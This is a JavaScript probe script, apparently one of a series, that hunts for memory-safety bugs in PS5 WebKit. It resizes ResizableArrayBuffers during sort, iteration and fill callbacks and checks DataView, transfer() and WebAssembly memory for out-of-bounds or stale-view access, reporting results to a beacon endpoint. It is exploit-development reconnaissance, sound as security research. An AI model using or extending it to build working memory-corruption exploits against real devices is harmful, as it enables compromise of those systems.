// CRASH_CLASS: MODERATE
// PROBE p558: RAB escalation — sort/iterate/fill resize races + feature inventory
//
// P555 confirmed RAB (ResizableArrayBuffer) supported on PS5 14.10 WebKit.
// TypedArray[idx] and .set() re-validate bounds after resize — safe.
// But sort comparators, iteration callbacks, and fill valueOf run INSIDE
// the C++ implementation, not in the binding layer. If the implementation
// caches buffer pointer/length before callbacks, resize during callback
// produces OOB access.
//
// Phases:
//   A) sort() with resize in comparator — most promising
//   B) forEach/every/find/map/filter with resize in callback
//   C) DataView on RAB after resize — different bounds path?
//   D) ArrayBuffer.transfer() / transferToFixedLength() — stale view
//   E) fill() / copyWithin() with valueOf that resizes
//   F) Feature inventory (Workers, SAB, Wasm, WeakRef, FinalizationRegistry)

document.write('<pre id="log" style="color:#0f0;background:#000;font:13px monospace;padding:8px;white-space:pre-wrap"></pre>');

(function () {
  var logEl = document.getElementById('log');

  function emit(tag, msg) {
    var line = tag + ' ' + msg;
    logEl.textContent += line + '\n';
    try {
      new Image().src = '/beacon/P558-' + encodeURIComponent(tag) +
        '?d=' + encodeURIComponent(String(msg).slice(0, 500));
    } catch (e) {}
  }

  emit('START', 'rab-escalation ua=' + navigator.userAgent.slice(0, 60));

  // Helper: check if RAB is supported
  var rabSupported = false;
  try {
    var testRab = new ArrayBuffer(64, { maxByteLength: 256 });
    rabSupported = typeof testRab.resize === 'function';
  } catch (e) {}

  if (!rabSupported) {
    emit('NO-RAB', 'ResizableArrayBuffer not supported');
    emit('ALIVE', 'aborted — no RAB');
    return;
  }
  emit('RAB-OK', 'supported');

  // ======================== PHASE A: sort() WITH RESIZE IN COMPARATOR ========================
  // Sort caches the buffer pointer and length at the start of the algorithm.
  // The comparator callback runs INSIDE the sort C++ — NOT in the binding layer.
  // If sort doesn't re-validate after each comparison, a resize during the
  // comparator gives OOB read/write on the old (freed or shrunk) buffer.

  emit('PHASE-A', 'start');

  try {
    // --- Test A1: shrink during sort ---
    var rabA1 = new ArrayBuffer(128, { maxByteLength: 512 });
    var f64A1 = new Float64Array(rabA1); // 16 floats
    // Fill descending so sort has work
    for (var i = 0; i < 16; i++) f64A1[i] = 16.0 - i;

    var a1Calls = 0;
    var a1Shrunk = false;
    var a1ContinuedAfter = false;
    var a1Threw = false;
    var a1LenDuring = -1;

    try {
      f64A1.sort(function (a, b) {
        a1Calls++;
        if (a1Calls === 5 && !a1Shrunk) {
          a1Shrunk = true;
          try { rabA1.resize(32); } catch (e) {} // shrink to 4 floats
          a1LenDuring = f64A1.length;
        }
        if (a1Shrunk && a1Calls > 5) a1ContinuedAfter = true;
        return a - b;
      });
    } catch (e) {
      a1Threw = true;
      emit('A1-THREW', e.name + ': ' + String(e).slice(0, 100));
    }

    // Grow back and read
    try { rabA1.resize(128); } catch (e) {}
    var a1Reads = [];
    var f64A1b = new Float64Array(rabA1);
    for (var j = 0; j < Math.min(16, f64A1b.length); j++) {
      var v = f64A1b[j];
      a1Reads.push(j + ':' + (v === undefined ? 'U' : v.toFixed(1)));
    }

    emit('A1-SHRINK', 'calls=' + a1Calls + ' shrunk=' + a1Shrunk +
      ' continued=' + a1ContinuedAfter + ' lenDuring=' + a1LenDuring +
      ' threw=' + a1Threw);
    emit('A1-DATA', a1Reads.join(','));

    // Check for unexpected (non-sentinel) values that indicate OOB read
    var a1Unexpected = 0;
    for (var k = 0; k < f64A1b.length; k++) {
      var vk = f64A1b[k];
      if (vk !== 0 && (vk < 0.5 || vk > 17)) a1Unexpected++;
    }
    if (a1Unexpected > 0) emit('A1-OOB', 'unexpected=' + a1Unexpected);

    // --- Test A2: grow during sort → old pointer may dangle ---
    var rabA2 = new ArrayBuffer(64, { maxByteLength: 1024 });
    var f64A2 = new Float64Array(rabA2); // 8 floats
    for (var i2 = 0; i2 < 8; i2++) f64A2[i2] = 8.0 - i2;

    var a2Calls = 0;
    var a2Grown = false;
    var a2Threw = false;
    var a2LenDuring = -1;

    try {
      f64A2.sort(function (a, b) {
        a2Calls++;
        if (a2Calls === 3 && !a2Grown) {
          a2Grown = true;
          try { rabA2.resize(512); } catch (e) {} // grow 8x
          a2LenDuring = f64A2.length;
        }
        return a - b;
      });
    } catch (e) {
      a2Threw = true;
      emit('A2-THREW', e.name + ': ' + String(e).slice(0, 100));
    }

    var a2Reads = [];
    var f64A2b = new Float64Array(rabA2);
    for (var j2 = 0; j2 < Math.min(16, f64A2b.length); j2++) {
      a2Reads.push(j2 + ':' + (f64A2b[j2] === undefined ? 'U' : f64A2b[j2].toFixed(1)));
    }
    emit('A2-GROW', 'calls=' + a2Calls + ' grown=' + a2Grown +
      ' lenDuring=' + a2LenDuring + ' threw=' + a2Threw);
    emit('A2-DATA', a2Reads.join(','));

    // If sort used stale pointer after grow, data may be corrupted or zero
    var a2Zeroed = 0;
    for (var k2 = 0; k2 < 8; k2++) {
      if (f64A2b[k2] === 0) a2Zeroed++;
    }
    if (a2Zeroed >= 4) emit('A2-STALE', 'zeroed=' + a2Zeroed + ' POSSIBLE_DANGLING');

  } catch (e) {
    emit('PHASE-A-ERR', String(e));
  }

  emit('PHASE-A', 'done');

  // ======================== PHASE B: ITERATION METHODS WITH RESIZE ========================
  // forEach/every/find/map/filter callbacks run inside the C++ iteration.
  // If length is cached at iteration start and not re-checked per step...

  emit('PHASE-B', 'start');

  function testIterMethod(name, fn) {
    try {
      var rab = new ArrayBuffer(128, { maxByteLength: 512 });
      var f64 = new Float64Array(rab); // 16 floats
      for (var i = 0; i < 16; i++) f64[i] = (i + 1) * 10;

      var visited = [];
      var resized = false;

      fn(f64, function (val, idx) {
        visited.push(idx);
        if (idx === 3 && !resized) {
          resized = true;
          try { rab.resize(32); } catch (e) {} // shrink to 4 floats
        }
        return true; // for every/find
      });

      var maxIdx = visited.length > 0 ? visited[visited.length - 1] : -1;
      var continued = maxIdx > 3;
      emit('B-' + name, 'visited=' + visited.length + ' max=' + maxIdx +
        ' continued=' + continued + ' resized=' + resized);

      if (continued) {
        // Iteration continued past shrunk boundary — potential OOB
        emit('B-' + name + '-OOB', 'CONTINUED_PAST_RESIZE max=' + maxIdx);
      }
    } catch (e) {
      emit('B-' + name + '-ERR', String(e).slice(0, 120));
    }
  }

  testIterMethod('forEach', function (arr, cb) { arr.forEach(cb); });
  testIterMethod('every', function (arr, cb) { arr.every(cb); });
  testIterMethod('find', function (arr, cb) { arr.find(function (v, i) { cb(v, i); return false; }); });
  testIterMethod('findIndex', function (arr, cb) { arr.findIndex(function (v, i) { cb(v, i); return false; }); });
  testIterMethod('some', function (arr, cb) { arr.some(function (v, i) { cb(v, i); return false; }); });

  // map and filter — return value
  testIterMethod('map', function (arr, cb) { arr.map(function (v, i) { cb(v, i); return v; }); });
  testIterMethod('filter', function (arr, cb) { arr.filter(function (v, i) { cb(v, i); return true; }); });

  // reduce — accumulator pattern
  try {
    var rabRed = new ArrayBuffer(128, { maxByteLength: 512 });
    var f64Red = new Float64Array(rabRed);
    for (var ir = 0; ir < 16; ir++) f64Red[ir] = ir + 1;
    var redVisited = [];
    var redResized = false;
    f64Red.reduce(function (acc, val, idx) {
      redVisited.push(idx);
      if (idx === 3 && !redResized) {
        redResized = true;
        try { rabRed.resize(32); } catch (e) {}
      }
      return acc + val;
    }, 0);
    var redMax = redVisited[redVisited.length - 1];
    emit('B-reduce', 'visited=' + redVisited.length + ' max=' + redMax +
      ' continued=' + (redMax > 3));
    if (redMax > 3) emit('B-reduce-OOB', 'CONTINUED max=' + redMax);
  } catch (e) {
    emit('B-reduce-ERR', String(e).slice(0, 120));
  }

  emit('PHASE-B', 'done');

  // ======================== PHASE C: DataView ON RAB AFTER RESIZE ========================
  // DataView might use a different bounds-checking path than TypedArray.

  emit('PHASE-C', 'start');

  try {
    var rabC = new ArrayBuffer(256, { maxByteLength: 1024 });
    var dvC = new DataView(rabC);

    // Write sentinel at offset 200
    dvC.setFloat64(200, 123456.789, true);

    // Shrink below offset 200
    rabC.resize(64);

    // Try reading at old offset
    var dvRead = 'N/A';
    var dvThrew = false;
    try {
      dvRead = dvC.getFloat64(200, true);
    } catch (e) {
      dvThrew = true;
      dvRead = e.name;
    }
    emit('C-READ', 'offset=200 threw=' + dvThrew + ' val=' + dvRead);

    // Try writing at old offset
    var dvWriteThrew = false;
    try {
      dvC.setFloat64(200, 999.999, true);
    } catch (e) {
      dvWriteThrew = true;
    }
    emit('C-WRITE', 'offset=200 threw=' + dvWriteThrew);

    // If neither threw, we have OOB R/W via DataView
    if (!dvThrew && !dvWriteThrew) {
      emit('C-OOB', 'DataView OOB R/W CONFIRMED');
    }

    // Try offset just past boundary
    var dvEdgeThrew = false;
    try {
      dvC.getFloat64(60, true); // valid (64 bytes, offset 60+8=68 > 64?)
    } catch (e) {
      dvEdgeThrew = true;
    }
    emit('C-EDGE', 'offset=60 threw=' + dvEdgeThrew + ' byteLen=' + rabC.byteLength);

    // Grow back and test DataView still works
    rabC.resize(256);
    var dvPost = dvC.getFloat64(200, true);
    emit('C-POST', 'after regrow offset=200 val=' + dvPost);

  } catch (e) {
    emit('PHASE-C-ERR', String(e).slice(0, 120));
  }

  emit('PHASE-C', 'done');

  // ======================== PHASE D: ArrayBuffer.transfer() ========================
  // transfer() detaches the source. If old views aren't properly neutered...

  emit('PHASE-D', 'start');

  try {
    var hasTransfer = typeof ArrayBuffer.prototype.transfer === 'function';
    var hasTransferFixed = typeof ArrayBuffer.prototype.transferToFixedLength === 'function';
    emit('D-FEAT', 'transfer=' + hasTransfer + ' transferToFixed=' + hasTransferFixed);

    if (hasTransfer) {
      var abD = new ArrayBuffer(128);
      var f64D = new Float64Array(abD);
      for (var id = 0; id < 16; id++) f64D[id] = (id + 1) * 111;

      var abD2 = abD.transfer(256);

      // Old view should be neutered
      var oldLen = -1;
      var oldRead = 'N/A';
      var oldThrew = false;
      try {
        oldLen = f64D.length;
        oldRead = f64D[0];
      } catch (e) {
        oldThrew = true;
        oldRead = e.name;
      }
      emit('D-OLD', 'len=' + oldLen + ' val=' + oldRead + ' threw=' + oldThrew);

      if (oldLen > 0 && !oldThrew && oldRead !== undefined) {
        emit('D-STALE', 'OLD VIEW STILL ACCESSIBLE len=' + oldLen);
      }

      // New buffer should have the data
      var f64D2 = new Float64Array(abD2);
      emit('D-NEW', 'len=' + f64D2.length + ' [0]=' + f64D2[0] + ' [15]=' + f64D2[15]);
    }

    if (hasTransferFixed) {
      var rabD3 = new ArrayBuffer(128, { maxByteLength: 512 });
      var f64D3 = new Float64Array(rabD3);
      f64D3[0] = 42.42;

      var fixedD = rabD3.transferToFixedLength();
      var oldLen3 = -1;
      var oldThrew3 = false;
      try {
        oldLen3 = f64D3.length;
      } catch (e) {
        oldThrew3 = true;
      }
      emit('D-FIXED', 'oldLen=' + oldLen3 + ' oldThrew=' + oldThrew3 +
        ' newLen=' + fixedD.byteLength + ' resizable=' + (typeof fixedD.resize === 'function'));

      if (oldLen3 > 0 && !oldThrew3) {
        emit('D-FIXED-STALE', 'OLD RAB VIEW STILL ACCESSIBLE');
      }
    }
  } catch (e) {
    emit('PHASE-D-ERR', String(e).slice(0, 120));
  }

  emit('PHASE-D', 'done');

  // ======================== PHASE E: fill() / copyWithin() WITH RESIZE ========================
  // fill(value) calls valueOf on value before writing. If fill() caches
  // length pre-valueOf, a resize in valueOf → OOB write.
  // copyWithin() doesn't call valueOf but may cache length at call start.

  emit('PHASE-E', 'start');

  try {
    // --- E1: fill() with shrink in valueOf ---
    var rabE1 = new ArrayBuffer(128, { maxByteLength: 512 });
    var f64E1 = new Float64Array(rabE1); // 16 floats
    for (var ie1 = 0; ie1 < 16; ie1++) f64E1[ie1] = 0xBEEF;

    var e1Fired = false;
    var e1Val = {
      valueOf: function () {
        if (!e1Fired) {
          e1Fired = true;
          try { rabE1.resize(32); } catch (e) {} // shrink to 4 floats
        }
        return 77.77;
      }
    };

    var e1Threw = false;
    try {
      f64E1.fill(e1Val);
    } catch (e) {
      e1Threw = true;
      emit('E1-THREW', e.name);
    }

    // Grow back and check how many elements were written
    try { rabE1.resize(128); } catch (e) {}
    var e1Reads = [];
    var f64E1b = new Float64Array(rabE1);
    var e1Written = 0;
    for (var je1 = 0; je1 < 16; je1++) {
      var ve1 = f64E1b[je1];
      e1Reads.push(je1 + ':' + (ve1 === undefined ? 'U' : ve1.toFixed(1)));
      if (Math.abs(ve1 - 77.77) < 0.01) e1Written++;
    }
    emit('E1-FILL', 'threw=' + e1Threw + ' written=' + e1Written + ' fired=' + e1Fired);
    emit('E1-DATA', e1Reads.join(','));

    if (e1Written > 4) {
      emit('E1-OOB', 'FILL WROTE PAST RESIZE BOUNDARY written=' + e1Written);
    }

    // --- E2: fill() with grow in valueOf ---
    var rabE2 = new ArrayBuffer(32, { maxByteLength: 512 });
    var f64E2 = new Float64Array(rabE2); // 4 floats
    for (var ie2 = 0; ie2 < 4; ie2++) f64E2[ie2] = 0xDEAD;

    var e2Fired = false;
    var e2Val = {
      valueOf: function () {
        if (!e2Fired) {
          e2Fired = true;
          try { rabE2.resize(256); } catch (e) {} // grow to 32 floats
        }
        return 88.88;
      }
    };

    var e2Threw = false;
    try {
      f64E2.fill(e2Val);
    } catch (e) {
      e2Threw = true;
      emit('E2-THREW', e.name);
    }

    var e2Reads = [];
    var f64E2b = new Float64Array(rabE2);
    var e2Written = 0;
    for (var je2 = 0; je2 < Math.min(16, f64E2b.length); je2++) {
      var ve2 = f64E2b[je2];
      e2Reads.push(je2 + ':' + (ve2 === undefined ? 'U' : ve2.toFixed(1)));
      if (Math.abs(ve2 - 88.88) < 0.01) e2Written++;
    }
    emit('E2-FILL', 'threw=' + e2Threw + ' written=' + e2Written);
    emit('E2-DATA', e2Reads.join(','));

    // --- E3: copyWithin() after resize ---
    // copyWithin doesn't have valueOf, but if it caches length at start:
    var rabE3 = new ArrayBuffer(128, { maxByteLength: 512 });
    var f64E3 = new Float64Array(rabE3); // 16 floats
    for (var ie3 = 0; ie3 < 16; ie3++) f64E3[ie3] = (ie3 + 1) * 100;

    rabE3.resize(32); // shrink to 4 floats
    var e3Threw = false;
    try {
      // Try copying from old range — should fail if properly bounds-checked
      f64E3.copyWithin(0, 8, 16);
    } catch (e) {
      e3Threw = true;
    }
    rabE3.resize(128);
    var e3Post = [];
    var f64E3b = new Float64Array(rabE3);
    for (var je3 = 0; je3 < 8; je3++) {
      e3Post.push(je3 + ':' + (f64E3b[je3] === undefined ? 'U' : f64E3b[je3].toFixed(0)));
    }
    emit('E3-COPY', 'threw=' + e3Threw + ' data=' + e3Post.join(','));

  } catch (e) {
    emit('PHASE-E-ERR', String(e).slice(0, 120));
  }

  emit('PHASE-E', 'done');

  // ======================== PHASE F: FEATURE INVENTORY ========================
  // Probe for advanced primitives available on PS5 14.10 WebKit.

  emit('PHASE-F', 'start');

  var features = {};

  // Web Workers
  features.Worker = typeof Worker !== 'undefined';

  // SharedArrayBuffer
  features.SAB = typeof SharedArrayBuffer !== 'undefined';
  if (features.SAB) {
    try {
      var sab = new SharedArrayBuffer(64);
      features.SAB_works = sab.byteLength === 64;
    } catch (e) {
      features.SAB_works = false;
      features.SAB_err = e.name;
    }
  }

  // WebAssembly
  features.Wasm = typeof WebAssembly !== 'undefined';
  if (features.Wasm) {
    features.WasmMemory = typeof WebAssembly.Memory !== 'undefined';
    if (features.WasmMemory) {
      try {
        var wm = new WebAssembly.Memory({ initial: 1, maximum: 10 });
        var wmBuf = wm.buffer;
        var wmOldLen = wmBuf.byteLength;
        wm.grow(1);
        var wmDetached = false;
        try {
          var test = new Uint8Array(wmBuf);
          wmDetached = test.length === 0;
        } catch (e) {
          wmDetached = true;
        }
        features.WasmGrow = 'oldLen=' + wmOldLen + ' newLen=' + wm.buffer.byteLength +
          ' oldDetached=' + wmDetached;
      } catch (e) {
        features.WasmGrow = 'err:' + e.name;
      }
    }
  }

  // WeakRef + FinalizationRegistry
  features.WeakRef = typeof WeakRef !== 'undefined';
  features.FinalizationRegistry = typeof FinalizationRegistry !== 'undefined';

  // Atomics
  features.Atomics = typeof Atomics !== 'undefined';

  // structuredClone
  features.structuredClone = typeof structuredClone !== 'undefined';

  // OffscreenCanvas
  features.OffscreenCanvas = typeof OffscreenCanvas !== 'undefined';

  // ReadableStream (for Blob reading patterns)
  features.ReadableStream = typeof ReadableStream !== 'undefined';

  // Temporal (bleeding edge)
  features.Temporal = typeof Temporal !== 'undefined';

  // Iterator helpers
  features.iteratorHelpers = typeof Iterator !== 'undefined';

  // Report features
  var fStr = [];
  for (var fk in features) {
    if (features.hasOwnProperty(fk)) fStr.push(fk + '=' + features[fk]);
  }
  // Split into chunks to avoid beacon truncation
  var chunk = '';
  var ci = 0;
  for (var fi = 0; fi < fStr.length; fi++) {
    chunk += (chunk ? ' ' : '') + fStr[fi];
    if (chunk.length > 350 || fi === fStr.length - 1) {
      emit('F-FEAT' + (ci > 0 ? ci : ''), chunk);
      chunk = '';
      ci++;
    }
  }

  // Wasm stale view test (if Memory.grow detaches old buffer)
  if (features.Wasm && features.WasmMemory) {
    try {
      var wm2 = new WebAssembly.Memory({ initial: 1, maximum: 4 });
      var oldBuf = wm2.buffer;
      var oldU8 = new Uint8Array(oldBuf);
      oldU8[0] = 0xAA;
      oldU8[1] = 0xBB;

      wm2.grow(1); // should detach oldBuf

      var staleLen = -1;
      var staleRead = 'N/A';
      var staleThrew = false;
      try {
        staleLen = oldU8.length;
        staleRead = oldU8[0];
      } catch (e) {
        staleThrew = true;
      }
      emit('F-WASM-STALE', 'oldLen=' + staleLen + ' oldRead=' + staleRead +
        ' threw=' + staleThrew);

      if (staleLen > 0 && !staleThrew && staleRead !== undefined) {
        emit('F-WASM-STALE-LIVE', 'OLD WASM VIEW ACCESSIBLE val=' + staleRead);
      }
    } catch (e) {
      emit('F-WASM-ERR', String(e).slice(0, 100));
    }
  }

  emit('PHASE-F', 'done');
  emit('ALIVE', 'all phases completed');
})();
